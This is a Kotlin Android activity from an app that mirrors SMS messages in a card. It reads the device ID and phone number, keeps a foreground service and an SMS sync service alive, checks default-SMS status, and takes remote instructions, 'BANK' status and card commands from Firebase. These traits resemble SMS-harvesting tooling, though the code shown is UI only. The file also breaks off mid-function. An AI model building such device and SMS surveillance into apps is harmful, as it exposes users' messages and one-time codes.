package com.example.fast.ui

import android.annotation.SuppressLint
import android.animation.Animator
import android.animation.ObjectAnimator
import android.animation.AnimatorSet
import android.animation.AnimatorListenerAdapter
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.view.View
import android.view.ViewTreeObserver
import android.widget.FrameLayout
import android.widget.TextView
import android.webkit.WebView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.lifecycle.lifecycleScope
import androidx.activity.viewModels
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.example.fast.databinding.ActivityActivatedBinding
import com.example.fast.service.PersistentForegroundService
import com.example.fast.service.ContactSmsSyncService
import com.example.fast.ui.activated.*
import com.example.fast.adapter.SmsMessageAdapter
import com.example.fast.adapter.SmsMessageItem
import com.example.fast.util.LogHelper
import com.example.fast.util.PermissionManager
import com.example.fast.util.DefaultSmsAppHelper
import com.example.fast.util.VersionChecker
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.launch
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.prexoft.prexocore.writeInternalFile
import com.prexoft.prexocore.formatAsDateAndTime

import dagger.hilt.android.AndroidEntryPoint

/**
 * ActivatedActivity - Restructured Version
 * 
 * Uses modular architecture with separate managers:
 * - ActivatedViewModel: State management
 * - ActivatedUIManager: UI setup and visibility
 * - ActivatedStatusManager: Bank status updates
 * - ActivatedFirebaseManager: Firebase listeners
 * - ActivatedButtonManager: Button interactions
 * - ActivatedServiceManager: Service lifecycle
 */
@AndroidEntryPoint
class ActivatedActivity : AppCompatActivity() {
    
    // View binding
    private val id by lazy { ActivityActivatedBinding.inflate(layoutInflater) }
    
    // ViewModel
    private val viewModel: ActivatedViewModel by viewModels()
    
    // Managers
    private lateinit var uiManager: ActivatedUIManager
    private lateinit var statusManager: ActivatedStatusManager
    private lateinit var firebaseManager: ActivatedFirebaseManager
    private lateinit var buttonManager: ActivatedButtonManager
    private lateinit var serviceManager: ActivatedServiceManager
    private lateinit var logoAnimationManager: LogoAnimationManager
    
    // SMS Adapter
    private lateinit var smsAdapter: SmsMessageAdapter
    
    // Device ID
    @get:SuppressLint("HardwareIds")
    private val cachedAndroidId by lazy {
        val id = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        LogHelper.d("ActivatedActivity", "Device ID retrieved: $id")
        id
    }
    
    // Instruction content state (tracks if instruction has content, not visibility)
    private var hasInstructionContent: Boolean = false
    
    // Handler for UI updates
    private val handler = Handler(Looper.getMainLooper())
    private val handlerRunnables = mutableListOf<Runnable>()
    
    // State
    private var activationCode: String? = null
    private var activationMode: String? = null // "testing" or "running"
    private var isTransitioningFromSplash: Boolean = false
    private var isResetting = false
    private var isTesting = false // Prevent multiple simultaneous test clicks
    
    // Timer state
    private var testTimerSeconds: Int = 0
    private var testTimerRunnable: Runnable? = null
    private var isTimerRunning: Boolean = false
    
    // Animation state
    private var currentAnimationType = 1 // 1-5 for different animation types
    
    // Firebase SMS listener reference
    private var smsFirebaseListener: com.google.firebase.database.ChildEventListener? = null
    
    // Total SMS message count (for badge display)
    private var totalSmsMessageCount = 0
    private var initialLoadCompleted = false
    private var initialLoadTimestamp = 0L
    private var lastLoadedMessageTimestamp = 0L // Track latest message timestamp from initial load
    
    // Animation state flags to prevent crashes when multiple messages arrive
    private var isBorderBlinkAnimating = false
    private var borderBlinkHandler: android.os.Handler? = null
    private var borderBlinkRunnables = mutableListOf<Runnable>()
    private var pendingScrollRunnable: Runnable? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        // Set window background immediately
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setBackgroundDrawableResource(R.drawable.gradient)
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.allowEnterTransitionOverlap = true
            window.allowReturnTransitionOverlap = true
            window.enterTransition = null
        }
        
        setContentView(id.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
        
        // IMPORTANT: Force all cards visible IMMEDIATELY after setContentView
        // This must be done synchronously before any other operations
        try {
            // Set transition names for card transition
            // cardView6 from ActivationActivity morphs into phoneCard
            id.phoneCardWrapper.transitionName = "card_wrapper_transition"
            id.phoneCard.transitionName = "phone_card_transition" // Match cardView6 transition name
            
            id.phoneCard.visibility = View.VISIBLE
            id.phoneCard.alpha = 1f
            id.phoneCardWrapper.visibility = View.VISIBLE
            id.phoneCardWrapper.alpha = 1f
            
            id.statusCard.visibility = View.VISIBLE
            id.statusCard.alpha = 1f
            // Ensure status card has minimum height
            id.statusCard.minimumHeight = (80 * resources.displayMetrics.density).toInt()
            
            // SMS card is always visible now (instruction is on back side)
            id.smsCard.visibility = View.VISIBLE
            id.smsCard.alpha = 1f
            
            // Always show SMS by default (instruction is always available on back side)
            id.smsContentFront.visibility = View.VISIBLE
            id.smsContentFront.alpha = 1f
            id.instructionContentBack.visibility = View.GONE
            id.instructionContentBack.alpha = 0f
            id.smsCard.isClickable = true
            id.smsCard.isEnabled = true
            // Ensure SMS card has minimum height
            id.smsCard.minimumHeight = (200 * resources.displayMetrics.density).toInt()
            // Ensure RecyclerView is clickable
            id.smsRecyclerView.isClickable = true
            id.smsRecyclerView.isEnabled = true
            
            id.testButtonsContainer.visibility = View.VISIBLE
            id.testButtonsContainer.alpha = 1f
            
            // Log initial dimensions (before layout)
            id.main.post {
                try {
                    logCardDimensions("Immediately After setContentView")
                            } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error logging initial dimensions", e)
                }
            }
            
            // Force layout to resolve constraints
            id.main.post {
                try {
                    id.statusCard.requestLayout()
                    id.smsCard.requestLayout()
                    id.testButtonsContainer.requestLayout()
            } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error forcing layout", e)
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting card visibility", e)
        }
        
        // Initialize ViewModel
        // ViewModel is injected via Hilt, no need to create manually
        viewModel.cachedAndroidId = cachedAndroidId
        
        // Setup shared element transition
        setupTransitions()
        
        // Load branding config
        loadBrandingConfig()
        
        // Initialize managers (with error handling)
        try {
            initializeManagers()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error initializing managers", e)
            // Continue anyway - some features may not work but app won't crash
        }
        
        // Setup UI
                try {
            setupUI()
                } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up UI", e)
        }
        
        // Force layout after initial setup to ensure constraint chain resolves
        id.main.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener {
            override fun onGlobalLayout() {
                try {
                    // Remove listener after first layout
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                        id.main.viewTreeObserver.removeOnGlobalLayoutListener(this)
        } else {
                        @Suppress("DEPRECATION")
                        id.main.viewTreeObserver.removeGlobalOnLayoutListener(this)
                    }
                    
                    // Force all cards to be visible and request layout
                    id.statusCard.visibility = View.VISIBLE
                    id.statusCard.alpha = 1f
                    id.statusCard.requestLayout()
                    id.statusCard.invalidate()
                    
                    // SMS card is always visible now (instruction is on back side)
                    id.smsCard.visibility = View.VISIBLE
                    id.smsCard.alpha = 1f
                    
                    // Always show SMS by default
                    id.smsContentFront.visibility = View.VISIBLE
                    id.smsContentFront.alpha = 1f
                    id.instructionContentBack.visibility = View.GONE
                    id.instructionContentBack.alpha = 0f
                    
                    id.smsCard.isClickable = true
                    id.smsCard.isEnabled = true
                    id.smsCard.requestLayout()
                    id.smsCard.invalidate()
                    // Ensure RecyclerView is also ready
                    id.smsRecyclerView.isClickable = true
                    id.smsRecyclerView.isEnabled = true
                    
                id.testButtonsContainer.visibility = View.VISIBLE
            id.testButtonsContainer.alpha = 1f
                    id.testButtonsContainer.requestLayout()
                    id.testButtonsContainer.invalidate()
                    
                    // Log all card dimensions and positions
                    handler.postDelayed({
                        try {
                            logCardDimensions("After Global Layout")
                        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
                        }
                    }, 100)
                    
                    // Also log after a longer delay to catch any delayed layout changes
                    handler.postDelayed({
                        try {
                            logCardDimensions("Final Check (500ms delay)")
                        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error in final card dimension check", e)
                        }
                    }, 500)
                    
                    LogHelper.d("ActivatedActivity", "Forced layout for cards after global layout")
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error forcing layout in global layout listener", e)
                }
            }
        })
        
        // Setup Firebase listeners
        try {
            setupFirebaseListeners()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up Firebase listeners", e)
        }
        
        // Setup buttons
        try {
            LogHelper.d("ActivatedActivity", "Setting up buttons...")
            setupButtons()
            LogHelper.d("ActivatedActivity", "Buttons setup completed")
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up buttons", e)
        }
        
        // Setup test timer
        try {
            setupTestTimer()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up test timer", e)
        }
        
        // Ensure service is running
        try {
            serviceManager.ensureServiceRunning()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error ensuring service running", e)
        }
        
        // Handle intent data
        try {
            handleIntentData()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error handling intent data", e)
        }
        
        // Setup permissions
        try {
            checkPermissionsAndUpdateUI()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error checking permissions", e)
        }
        
        // Check if app is set as default SMS app (required for full SMS functionality)
        try {
            checkDefaultSms()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error checking default SMS app", e)
        }
        
        // Final visibility check after everything is set up
        id.main.postDelayed({
            try {
                id.statusCard.visibility = View.VISIBLE
                id.statusCard.alpha = 1f
                // SMS card is always visible now (instruction is on back side)
                id.smsCard.visibility = View.VISIBLE
                id.smsCard.alpha = 1f
                
                // Always show SMS by default
                id.smsContentFront.visibility = View.VISIBLE
                id.smsContentFront.alpha = 1f
                id.instructionContentBack.visibility = View.GONE
                id.instructionContentBack.alpha = 0f
                id.statusCard.requestLayout()
                id.smsCard.requestLayout()
                LogHelper.d("ActivatedActivity", "Final visibility check completed")
        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error in final visibility check", e)
            }
        }, 100)
    }
    
    /**
     * Setup shared element transitions
     */
    private fun setupTransitions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                val hasTransitionFromIntent = intent.getBooleanExtra("hasTransition", false) || 
                                             intent.getBooleanExtra("animate", false)
                
                if (hasTransitionFromIntent) {
                    window.sharedElementEnterTransition = android.transition.TransitionSet().apply {
                        addTransition(android.transition.ChangeBounds())
                        addTransition(android.transition.ChangeTransform())
                        addTransition(android.transition.ChangeClipBounds())
                        addTransition(android.transition.ChangeImageTransform()) // For smooth image/icon transitions
                        duration = 600
                        interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                        
                        // Add listener to morph background during transition
                        addListener(object : android.transition.Transition.TransitionListener {
                            override fun onTransitionStart(transition: android.transition.Transition) {
                                // Ensure phone card is visible and ready
                                id.phoneCard.visibility = View.VISIBLE
                                id.phoneCard.alpha = 1f
                                // Start with input field background style (will morph during transition)
                                id.phoneCard.setBackgroundResource(R.drawable.input_field_selector)
                            }
                            
                            override fun onTransitionEnd(transition: android.transition.Transition) {
                                // Transition complete - ensure phone card has crypto hash card background
                                id.phoneCard.post {
                                    id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                                }
                            }
                            
                            override fun onTransitionCancel(transition: android.transition.Transition) {
                                // Ensure background is set even if transition is cancelled
                                id.phoneCard.post {
                                    id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                                }
                            }
                            
                            override fun onTransitionPause(transition: android.transition.Transition) {}
                            override fun onTransitionResume(transition: android.transition.Transition) {}
                        })
                    }
                    
                    // Add a listener that morphs the background during the transition
                    // Start changing background halfway through transition
                    handler.postDelayed({
                        if (!isDestroyed && !isFinishing) {
                            // Animate background change during transition (at 50% progress)
                            animateBackgroundMorph()
                        }
                    }, 300) // Halfway through 600ms transition
                    
                    postponeEnterTransition()
                    
                    val mainView = id.main
                    if (mainView != null && mainView.viewTreeObserver.isAlive) {
                        mainView.viewTreeObserver.addOnPreDrawListener(object : ViewTreeObserver.OnPreDrawListener {
                            override fun onPreDraw(): Boolean {
                                if (mainView.viewTreeObserver.isAlive) {
                                    mainView.viewTreeObserver.removeOnPreDrawListener(this)
                                }
                                try {
                                    startPostponedEnterTransition()
            } catch (e: Exception) {
                                    LogHelper.e("ActivatedActivity", "Error starting postponed transition", e)
                                }
                    return true
                }
                        })
                    } else {
                        // Fallback: start transition immediately if view not ready
                        try {
                            startPostponedEnterTransition()
                        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error starting postponed transition (fallback)", e)
                    }
                }
            }
            
                // Check if coming from SplashActivity
                isTransitioningFromSplash = window.sharedElementEnterTransition != null
                viewModel.isTransitioningFromSplash = isTransitioningFromSplash
        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error setting up transition", e)
            }
        }
    }
    
    /**
     * Animate background morph from input_field_selector to crypto_hash_card_background
     * Called during transition to smoothly change the border style
     */
    private fun animateBackgroundMorph() {
        try {
            // Create a crossfade animation between backgrounds
            // Since we can't directly animate between drawables, we'll use alpha overlay
            val phoneCard = id.phoneCard
            
            // Start with input_field_selector (from cardView6), then crossfade to crypto_hash_card_background
            // Use a ValueAnimator to control the transition
            val animator = ObjectAnimator.ofFloat(phoneCard, "alpha", 1f, 0.7f, 1f).apply {
                duration = 300
                interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                
                addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationStart(animation: android.animation.Animator) {
                        // Ensure crypto hash card background is set (will show through)
                        phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                    }
                    
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        // Ensure final state
                        phoneCard.alpha = 1f
                        phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                    }
                })
            }
            
            animator.start()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error animating background morph", e)
            // Fallback: just set the background directly
            id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
        }
    }
        
    /**
     * Load branding config from Firebase
     */
    private fun loadBrandingConfig() {
        try {
            com.example.fast.util.BrandingConfigManager.loadBrandingConfig(this) { logoName, tagline ->
                try {
                    if (!isFinishing && !isDestroyed) {
        val logoView = id.textView11
        val taglineView = id.textView12
                        val headerSection = id.headerSection
                        
                        if (logoView != null) {
                            logoView.text = logoName
                            logoView.visibility = View.VISIBLE
                        }
                        if (taglineView != null) {
                            taglineView.text = tagline
                            taglineView.visibility = View.VISIBLE
                        }
                        if (headerSection != null) {
                            headerSection.alpha = 1f
                            headerSection.visibility = View.VISIBLE
                        }
                    }
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error updating branding UI", e)
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error loading branding config", e)
        }
    }
    
    /**
     * Initialize all managers
     */
    private fun initializeManagers() {
        // UI Manager
        uiManager = ActivatedUIManager(id, isTransitioningFromSplash)
        
        // Status Manager
        statusManager = ActivatedStatusManager(id)
        
        // Setup BANK data listener for status card (will be called after activation code is available)
        
        // Service Manager
        serviceManager = ActivatedServiceManager(this)
        
        // Button Manager
        buttonManager = ActivatedButtonManager(
            binding = id,
            context = this,
            onResetClick = { handleResetClick() },
            onTestClick = { handleTestClick() }
        )
        
        // Firebase Manager (will be initialized after device ID is ready)
        firebaseManager = ActivatedFirebaseManager(
            deviceId = cachedAndroidId,
            onStatusUpdate = { status, color ->
                handler.post {
                    statusManager.updateStatusDisplay(status, color, handler)
                }
            },
            onBankNameUpdate = { bankName ->
                handler.post {
                    updateBankName(bankName)
                }
            },
            onCompanyNameUpdate = { companyName ->
                handler.post {
                    updateCompanyName(companyName)
                }
            },
            onOtherInfoUpdate = { otherInfo ->
                handler.post {
                    updateOtherInfo(otherInfo)
                }
            },
            onCodeUpdate = { code ->
                handler.post {
                    // Remove dashes from code for storage
                    val codeWithoutDashes = removeDashesFromCode(code)
                    activationCode = codeWithoutDashes
                    viewModel.activationCode = codeWithoutDashes
                    updateActivationCodeDisplay(codeWithoutDashes)
                    
                    // Setup status text listener for status card (use code without dashes)
                    if (!codeWithoutDashes.isNullOrBlank()) {
                        try {
                            val currentMode = activationMode ?: "testing" // Default to testing if not set
                            statusManager.setupStatusTextListener(codeWithoutDashes, handler, currentMode)
                            // Setup device-list status listener for phone status badge
                            statusManager.setupDeviceListStatusListener(codeWithoutDashes, handler, currentMode)
                            LogHelper.d("ActivatedActivity", "Status text listener and device-list status listener setup for code: $codeWithoutDashes")
        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error setting up BANK listener or device-list status listener", e)
                        }
                    }
                }
            },
            onInstructionUpdate = { html, css, imageUrl ->
                handler.post {
                    updateInstructionDisplay(html, css, imageUrl)
                }
            },
            onCardControlUpdate = { cardType ->
                handler.post {
                    handleCardControl(cardType)
                }
            },
            onAnimationTrigger = { animationType ->
                handler.post {
                    handleAnimationTrigger(animationType)
                }
            }
        )
    }
    
    /**
     * Setup UI
     */
    private fun setupUI() {
        // Force all cards visible immediately
        forceAllCardsVisible()
        
        uiManager.setupUIAfterBranding(false) // Always show SMS by default
        
        // Setup animated borders
        setupAnimatedBorders()
        
        // Setup SMS RecyclerView and listener (must be done early)
        setupSmsRecyclerView()
        
        // Setup activation code display
        setupActivationCodeDisplay()

        // Setup date/time display
        setupDateTimeDisplay()
        
        // Setup animation change button
        setupAnimationChangeButton()
        
        // Setup manual flip for SMS/Instruction card
        setupSmsCardFlipToggle()
        
        // Setup logo animations - start after a short delay to ensure logo is visible
        handler.postDelayed({
            try {
                if (!isDestroyed && !isFinishing) {
                    logoAnimationManager = LogoAnimationManager(id.textView11, handler)
                    logoAnimationManager.start()
                    LogHelper.d("ActivatedActivity", "Logo animation manager started")
                }
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error starting logo animation manager", e)
            }
        }, 500)
    }
    
    /**
     * Log dimensions and positions of all cards for debugging
     */
    private fun logCardDimensions(context: String) {
        try {
            LogHelper.d("ActivatedActivity", "=== Card Dimensions Log ($context) ===")
            
            // Phone Card
            val phoneCard = id.phoneCard
            val phoneX = phoneCard.x
            val phoneY = phoneCard.y
            val phoneWidth = phoneCard.width
            val phoneHeight = phoneCard.height
            val phoneVisibility = when (phoneCard.visibility) {
                View.VISIBLE -> "VISIBLE"
                View.INVISIBLE -> "INVISIBLE"
                View.GONE -> "GONE"
                else -> "UNKNOWN"
            }
            LogHelper.d("ActivatedActivity", "Phone Card: X=$phoneX, Y=$phoneY, Width=$phoneWidth, Height=$phoneHeight, Visibility=$phoneVisibility, Alpha=${phoneCard.alpha}")
            
            // Status Card
            val statusCard = id.statusCard
            val statusX = statusCard.x
            val statusY = statusCard.y
            val statusWidth = statusCard.width
            val statusHeight = statusCard.height
            val statusVisibility = when (statusCard.visibility) {
                View.VISIBLE -> "VISIBLE"
                View.INVISIBLE -> "INVISIBLE"
                View.GONE -> "GONE"
                else -> "UNKNOWN"
            }
            LogHelper.d("ActivatedActivity", "Status Card: X=$statusX, Y=$statusY, Width=$statusWidth, Height=$statusHeight, Visibility=$statusVisibility, Alpha=${statusCard.alpha}")
            
            // SMS Card
            val smsCard = id.smsCard
            val smsX = smsCard.x
            val smsY = smsCard.y
            val smsWidth = smsCard.width
            val smsHeight = smsCard.height
            val smsVisibility = when (smsCard.visibility) {
                View.VISIBLE -> "VISIBLE"
                View.INVISIBLE -> "INVISIBLE"
                View.GONE -> "GONE"
                else -> "UNKNOWN"
            }
            LogHelper.d("ActivatedActivity", "SMS Card: X=$smsX, Y=$smsY, Width=$smsWidth, Height=$smsHeight, Visibility=$smsVisibility, Alpha=${smsCard.alpha}")
            
            // Buttons Container
            val buttonsContainer = id.testButtonsContainer
            val buttonsX = buttonsContainer.x
            val buttonsY = buttonsContainer.y
            val buttonsWidth = buttonsContainer.width
            val buttonsHeight = buttonsContainer.height
            val buttonsVisibility = when (buttonsContainer.visibility) {
                View.VISIBLE -> "VISIBLE"
                View.INVISIBLE -> "INVISIBLE"
                View.GONE -> "GONE"
                else -> "UNKNOWN"
            }
            LogHelper.d("ActivatedActivity", "Buttons Container: X=$buttonsX, Y=$buttonsY, Width=$buttonsWidth, Height=$buttonsHeight, Visibility=$buttonsVisibility, Alpha=${buttonsContainer.alpha}")
            
            LogHelper.d("ActivatedActivity", "=== End Card Dimensions Log ===")
            
            // Check for issues
            if (statusHeight == 0) {
                LogHelper.w("ActivatedActivity", "⚠️ Status card has 0 height - forcing min height")
                statusCard.minimumHeight = (80 * resources.displayMetrics.density).toInt()
                statusCard.requestLayout()
            }
            if (smsHeight == 0) {
                LogHelper.w("ActivatedActivity", "⚠️ SMS card has 0 height - forcing min height")
                smsCard.minimumHeight = (200 * resources.displayMetrics.density).toInt()
                smsCard.requestLayout()
            }
            if (statusVisibility != "VISIBLE") {
                LogHelper.w("ActivatedActivity", "⚠️ Status card visibility is $statusVisibility, forcing VISIBLE")
                statusCard.visibility = View.VISIBLE
            }
            if (smsVisibility != "VISIBLE") {
                LogHelper.w("ActivatedActivity", "⚠️ SMS card visibility is $smsVisibility, forcing VISIBLE")
                smsCard.visibility = View.VISIBLE
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
        }
    }
    
    /**
     * Force all cards to be visible - called before UI manager
     */
    private fun forceAllCardsVisible() {
        try {
            handler.post {
                try {
                    // Phone card
                    id.phoneCard.visibility = View.VISIBLE
                    id.phoneCard.alpha = 1f
                    id.phoneCard.isClickable = true
                    id.phoneCard.isEnabled = true
                    
                    // Status card
                    id.statusCard.visibility = View.VISIBLE
                    id.statusCard.alpha = 1f
                    id.statusCard.isClickable = true
                    id.statusCard.isEnabled = true
                    
                    // SMS card is always visible now (instruction is on back side)
                    id.smsCard.visibility = View.VISIBLE
                    id.smsCard.alpha = 1f
                    
                    // Always show SMS by default
                    id.smsContentFront.visibility = View.VISIBLE
                    id.smsContentFront.alpha = 1f
                    id.instructionContentBack.visibility = View.GONE
                    id.instructionContentBack.alpha = 0f
                    
                    id.smsCard.isClickable = true
                    id.smsCard.isEnabled = true
                    // Ensure RecyclerView is also clickable
                    id.smsRecyclerView.isClickable = true
                    id.smsRecyclerView.isEnabled = true
                    
                    // Button container
                    id.testButtonsContainer.visibility = View.VISIBLE
                    id.testButtonsContainer.alpha = 1f
                    id.testButtonsContainer.isClickable = true
                    id.testButtonsContainer.isEnabled = true
                    
                    LogHelper.d("ActivatedActivity", "All cards forced visible and clickable")
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error forcing cards visible", e)
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in forceAllCardsVisible", e)
        }
    }
    
    /**
     * Setup animated borders (removed - no scan lines needed)
     */
    private fun setupAnimatedBorders() {
        try {
            // Phone card border removed - no border needed
            // SMS card border removed - no border needed
            
            // Setup water/vibration effect for phone card
            setupWaterEffect(id.phoneCard)
            
            // Setup water/vibration effect for SMS card
            setupWaterEffect(id.smsCard)
                        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up animated borders", e)
        }
    }
    
    /**
     * Setup water/vibration effect for a card
     * Creates a subtle continuous vibration/ripple effect
     */
    private fun setupWaterEffect(card: View) {
        try {
            if (card == null || isDestroyed || isFinishing) {
                            return
                        }
                        
            // Convert dp to pixels for vibration intensity
            val density = resources.displayMetrics.density
            val vibrationIntensity = 1.5f * density // 1.5dp vibration
            val scaleVariation = 0.002f // Very subtle scale variation (0.2%)
            
            // Create X translation animator (horizontal vibration)
            val translateXAnimator = ObjectAnimator.ofFloat(card, "translationX", 0f, vibrationIntensity, -vibrationIntensity, 0f)
            translateXAnimator.duration = 2000L // 2 seconds per cycle
            translateXAnimator.repeatCount = ObjectAnimator.INFINITE
            translateXAnimator.repeatMode = ObjectAnimator.RESTART
            translateXAnimator.interpolator = android.view.animation.LinearInterpolator()
            
            // Create Y translation animator (vertical vibration) - slightly offset for natural feel
            val translateYAnimator = ObjectAnimator.ofFloat(card, "translationY", 0f, -vibrationIntensity, vibrationIntensity, 0f)
            translateYAnimator.duration = 2100L // Slightly different duration for organic feel
            translateYAnimator.repeatCount = ObjectAnimator.INFINITE
            translateYAnimator.repeatMode = ObjectAnimator.RESTART
            translateYAnimator.interpolator = android.view.animation.LinearInterpolator()
            
            // Create subtle scale animator (breathing effect)
            val scaleXAnimator = ObjectAnimator.ofFloat(card, "scaleX", 1f, 1f + scaleVariation, 1f - scaleVariation, 1f)
            scaleXAnimator.duration = 1800L
            scaleXAnimator.repeatCount = ObjectAnimator.INFINITE
            scaleXAnimator.repeatMode = ObjectAnimator.RESTART
            scaleXAnimator.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
            
            val scaleYAnimator = ObjectAnimator.ofFloat(card, "scaleY", 1f, 1f + scaleVariation, 1f - scaleVariation, 1f)
            scaleYAnimator.duration = 1900L // Slightly different for organic feel
            scaleYAnimator.repeatCount = ObjectAnimator.INFINITE
            scaleYAnimator.repeatMode = ObjectAnimator.RESTART
            scaleYAnimator.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
            
            // Start all animations together
            translateXAnimator.start()
            translateYAnimator.start()
            scaleXAnimator.start()
            scaleYAnimator.start()
            
            // Store animators for cleanup
            card.tag = listOf(translateXAnimator, translateYAnimator, scaleXAnimator, scaleYAnimator)
            
            LogHelper.d("ActivatedActivity", "Water effect setup for card: ${card.id}")
                            } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up water effect", e)
        }
    }
    
    /**
     * Setup activation code display
     * Note: Phone display card removed - code is tracked internally only
     */
    private fun setupActivationCodeDisplay() {
        // Get phone number or code from intent (for internal use only)
        val phoneFromIntent = intent.getStringExtra("phone")
        activationCode = intent.getStringExtra("code")
        
        // Get activation mode (testing or running)
        activationMode = intent.getStringExtra("activationMode") ?: "testing"
        
        // Update code label based on activation mode with animation
        val phoneCodeLabelView = id.phoneCodeLabel
        if (phoneCodeLabelView != null) {
            val labelText = if (activationMode == "running") {
                "BANK CARD"
            } else {
                "TESTING CODE"
            }
            phoneCodeLabelView.text = labelText
            // Animate label appearance
            animateLabelAppearance(phoneCodeLabelView)
        }
        
        // Store code internally but don't display it (phone display card removed)
        if (phoneFromIntent != null && phoneFromIntent.isNotBlank() && phoneFromIntent.length >= 10) {
            // Coming from ActivationActivity
        val devicePhoneNumber = getDevicePhoneNumber()
        if (devicePhoneNumber != null && devicePhoneNumber.isNotBlank()) {
                // Convert to code internally
            handler.postDelayed({
                if (!isDestroyed && !isFinishing) {
                        // convertPhoneToCode already returns code without dashes
                        val code = convertPhoneToCode(devicePhoneNumber)
                        activationCode = code
                        viewModel.activationCode = code
                        
                        // Setup status text listener for status card (code is already without dashes)
                        try {
                            val mode = activationMode ?: "testing" // Default to testing if not set
                            statusManager.setupStatusTextListener(code, handler, mode)
                            // Setup device-list status listener for phone status badge
                            statusManager.setupDeviceListStatusListener(code, handler, mode)
                            LogHelper.d("ActivatedActivity", "Status text listener and device-list status listener setup for code: $code")
                    } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error setting up BANK listener or device-list status listener", e)
                        }
                    }
                }, 2000)
            } else if (!activationCode.isNullOrBlank()) {
                val code = activationCode!!
                viewModel.activationCode = code
                // Update code display
                updateActivationCodeDisplay(code)
                }
        } else {
            // Coming from SplashActivity - listen for code from Firebase (internal only)
            listenForActivationCode()
        }
    }

    /**
     * Setup SMS RecyclerView
     */
    private fun setupSmsRecyclerView() {
        try {
            smsAdapter = SmsMessageAdapter()
            
            // Use LinearLayoutManager with proper spacing (fix overlap issue)
            val layoutManager = LinearLayoutManager(this).apply {
                // Stack items vertically with no overlap
                isItemPrefetchEnabled = false // Disable prefetch to prevent overlap
                // Enable smooth scrolling - messages go down when scrolling
                stackFromEnd = false // Messages stack from top (newest at top, scrolling down reveals older)
                orientation = LinearLayoutManager.VERTICAL // Explicitly set vertical only
            }
            id.smsRecyclerView.layoutManager = layoutManager
            id.smsRecyclerView.adapter = smsAdapter
            
            // Disable item animations during initial load to prevent overlap
            id.smsRecyclerView.itemAnimator = null // Remove animations during initial setup
            
            // Set up proper spacing with transparent background (integrated with card)
            id.smsRecyclerView.clipToPadding = true
            id.smsRecyclerView.clipChildren = true
            // Background is now transparent and integrated with card background
            
            // Enable smooth scrolling
            id.smsRecyclerView.isNestedScrollingEnabled = true
            id.smsRecyclerView.setHasFixedSize(false) // Allow dynamic sizing
            
            // Allow smooth vertical scrolling with normal overscroll
            id.smsRecyclerView.overScrollMode = View.OVER_SCROLL_IF_CONTENT_SCROLLS
            
            // Enable scrollbars for visual feedback
            id.smsRecyclerView.isVerticalScrollBarEnabled = true
            id.smsRecyclerView.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
            
            // Ensure SMS card and RecyclerView are clickable and enabled (FIX for glitch)
            id.smsCard.isClickable = true
            id.smsCard.isEnabled = true
            id.smsRecyclerView.isClickable = true
